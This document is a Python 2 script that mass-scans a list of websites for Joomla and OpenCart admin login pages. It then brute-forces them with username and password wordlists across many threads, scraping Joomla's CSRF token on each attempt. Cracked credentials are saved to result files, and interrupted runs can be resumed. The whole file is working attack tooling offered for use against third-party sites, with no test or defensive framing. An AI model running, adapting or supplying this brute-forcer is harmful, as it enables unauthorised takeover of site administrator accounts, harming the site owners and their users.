#!/usr/bin/env python
import random
import requests
from bs4 import BeautifulSoup
from threading import *
from threading import Thread
from ConfigParser import ConfigParser
from Queue import Queue

# Fix too many open files (RAM => 8GB)
try:
    import resource
    
    resource.setrlimit(resource.RLIMIT_NOFILE, (8192, 8192)) # for RAM 8
    resource.getrusage(resource.RUSAGE_CHILDREN)
    resource.RLIMIT_CPU
except:
    pass

# Color
import colorama
from colorama import init
init(autoreset=True)

bgreen = colorama.Fore.GREEN + colorama.Style.BRIGHT
bred = colorama.Fore.RED + colorama.Style.BRIGHT
bblue = colorama.Fore.BLUE + colorama.Style.BRIGHT
byellow = colorama.Fore.YELLOW + colorama.Style.BRIGHT
bmagneta = colorama.Fore.MAGENTA + colorama.Style.BRIGHT
bcyan = colorama.Fore.CYAN + colorama.Style.BRIGHT
bwhite = colorama.Fore.WHITE + colorama.Style.BRIGHT

rancolor = [bgreen, byellow, bmagneta, bcyan]
NORMALIZE = colorama.Style.RESET_ALL

# Request Options
requests.packages.urllib3.disable_warnings()
session = requests.Session()
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}

# Make Folder
try:
    import os
    os.mkdir('result')
except:
    pass

# Thread Class Worker
pid_Restore = '.log_Session'

class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try: func(*args, **kargs)
            except Exception, e: print 'a'
            self.tasks.task_done()

class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads): Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        self.tasks.join()

# Class so Print won't messed up when using threading
from threading import RLock

class SynchronizedEcho(object):
    print_lock = RLock()
    def __init__(self, global_lock=True):
        if not global_lock:
            self.print_lock = RLock()

    def __call__(self, msg):
        with self.print_lock:
            print(msg)

echo = SynchronizedEcho()  

def local_time():
    import time
    
    t = time.localtime()
    current_time = time.strftime("%H:%M:%S", t)
    return current_time
    
class JoomlaBrute:
    def __init__(self, warna, target):
        self.warna = warna
        self.wordlist = 'lib/passwords.txt'
        self.userlist = 'lib/usernames.txt'
        self.ret = 'aW5kZXgucGhw'
        self.option='com_login'
        self.task='login'
        self.target = target
        self.sendrequest()
        
    def sendrequest(self):
        if self.userlist:
            for user in self.getdata(self.userlist):
                self.username=user.decode('utf-8')
                self.doGET()
        else:
            self.doGET()
        
    def doGET(self):
        try:
            for password in self.getdata(self.wordlist):
                # Get CSRF
                REQ = session.get(self.target, headers=headers, verify=False)
                soup = BeautifulSoup(REQ.text, 'html.parser')
                longstring = (soup.find_all('input', type='hidden')[-1]).get('name')
                password = password.decode('utf-8')

                data = {
                    'username' : self.username,
                    'passwd' : password,
                    'option' : self.option,
                    'task' : self.task,
                    'return' : self.ret,
                    longstring : '1'
                }
                headers_2 = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36',
                            'Content-Type': 'application/x-www-form-urlencoded'
                            }
                LOGIN = session.post(self.target, data = data, headers=headers_2, verify=False)
                if 'task=logout' in str(LOGIN.text):
                    echo('[{}{}{}] (Joomla) Login Success : [{}{}{}]\n[+] Username : [{}{}{}]\n[+] Password : [{}{}{}]'.format(bwhite, local_time(), NORMALIZE, self.warna, self.target, NORMALIZE, self.warna, self.username, NORMALIZE, self.warna, password, NORMALIZE))
                    open('result/LOGIN.Joomla.txt', 'a').write('{}|{}|{}'.format(self.target, self.username, password) + '\n')
                    break
                else:
                    echo("[{}{}{}][{}{}:{}{}] : {}".format(bred, local_time(), NORMALIZE, bred, self.username, password, NORMALIZE, self.target))
        except Exception as e:
            pass
        
    def getdata(self,path):
        with open(path, 'rb+') as f:
            data = ([line.rstrip() for line in f])
            f.close()
        return data
        
class OpencartBrute:
    def __init__(self, warna, target):
        self.warna = warna
        self.wordlist = 'lib/passwords.txt'
        self.userlist = 'lib/usernames.txt'
        self.target = target
        self.sendrequest()
        
    def sendrequest(self):
        if self.userlist:
            for user in self.getdata(self.userlist):
                self.username=user.decode('utf-8')
                self.doGET()
        else:
            self.doGET()
        
    def doGET(self):
        try:
            for password in self.getdata(self.wordlist):
                password = password.decode('utf-8')

                data = {
                    'username' : self.username,
                    'password' : password
                }

                LOGIN = session.post(self.target + '?route=common/login', data = data, headers=headers, verify=False)
                if 'route=common/dashboard' in LOGIN.url or 'common/logout' in LOGIN.text:
                    echo('[{}{}{}] (OpenCart) Login Success : [{}{}{}]\n[+] Username : [{}{}{}]\n[+] Password : [{}{}{}]'.format(bwhite, local_time(), NORMALIZE, self.warna, self.target, NORMALIZE, self.warna, self.username, NORMALIZE, self.warna, password, NORMALIZE))
                    open('result/LOGIN.OpenCart.txt', 'a').write('{}|{}|{}'.format(self.target, self.username, password) + '\n')
                    break
                else:
                    echo("[{}{}{}][{}{}:{}{}] : {}".format(bred, local_time(), NORMALIZE, bred, self.username, password, NORMALIZE, self.target))
        except Exception as e:
            pass
        
    def getdata(self,path):
        with open(path, 'rb+') as f:
            data = ([line.rstrip() for line in f])
            f.close()
        return data

def runner(url):
    try:
        warna = random.choice(rancolor)
        target_Joomla = url + '/administrator/index.php'
        target_OpenCart = url + '/admin/index.php'

        checkLogin = session.get(target_Joomla, headers=headers, verify=False)
        if 'value="1"' in checkLogin.text and 'name="passwd"' in checkLogin.text:
            JoomlaBrute(warna, target_Joomla)
            open('result/CMS.joomla.txt', 'a').write(url + '\n')
            return
        else:
            echo("[{}{}{}][{}Not Joomla!{}] : {}".format(bred, local_time(), NORMALIZE, bred, NORMALIZE, url))
            
        checkLogin = session.get(target_OpenCart, headers=headers, verify=False)
        if 'name="username"' in checkLogin.text and 'fa fa-key' in checkLogin.text:
            OpencartBrute(warna, target_OpenCart)
            open('result/CMS.opencart.txt', 'a').write(url + '\n')
            return
        else:
            echo("[{}{}{}][{}Not OpenCart!{}] : {}".format(bred, local_time(), NORMALIZE, bred, NORMALIZE, url))
    except Exception as e:
        pass
    
# Threading Jobs Start Here!
if __name__ == '__main__':
    try:
        configRead = ConfigParser()
        configRead.read(pid_Restore)
        targetList = configRead.get('DB', 'FILES')
        numThread = configRead.get('DB', 'THREAD')
        Session = configRead.get('DB', 'SESSION')
        
        print('Configuration Details : \n\t[+] List Files = %s\n\t[+] Thread = %s\n\t[+] Session = %s' % (targetList, numThread, Session))
        Quest = raw_input("\tLog Session Founds! Wanna Restore Session? [Y/n] : ")
        
        if "Y" in Quest or "y" in Quest:
            lists = open(targetList).read().split("\n"+Session)[1]
            readSplit = lists.splitlines()
        else:
            whatever31337 # Send Error to Exception
    except:
        try:
            targetList = sys.argv[1]
            numThread = sys.argv[2]
            readSplit = open(targetList).read().splitlines()
        except:
            try:
                targetList = raw_input("[+] Input List : ")
                readSplit = open(targetList).read().splitlines()
            except:
                print("File List not Founds!")
                exit()
            try:
                numThread = '20'
            except:
                print("Thread value must be Numeric!")
                exit()
                
    pool = ThreadPool(int(numThread))

    for url in readSplit:
        urlSession = url
        
        if "://" in url:
            url = url
        else:
            url = "http://" + url
            
        if url.endswith('/'):
            url = url[:-1]
                    
        try:
            pool.add_task(runner, url)
        except KeyboardInterrupt:
            session = open(pid_Restore, 'w')
            configSession = "[DB]\nFILES="+targetList+"\nTHREAD="+str(numThread)+"\nSESSION="+urlSession+"\n"
            session.write(configSession)
            session.close()
            print("Job Canceled! Session Saved on ( {} ) Files.".format(pid_Restore))
            exit()
            
    pool.wait_completion()
    try:
        import os
        os.remove(pid_Restore)
    except:
        pass
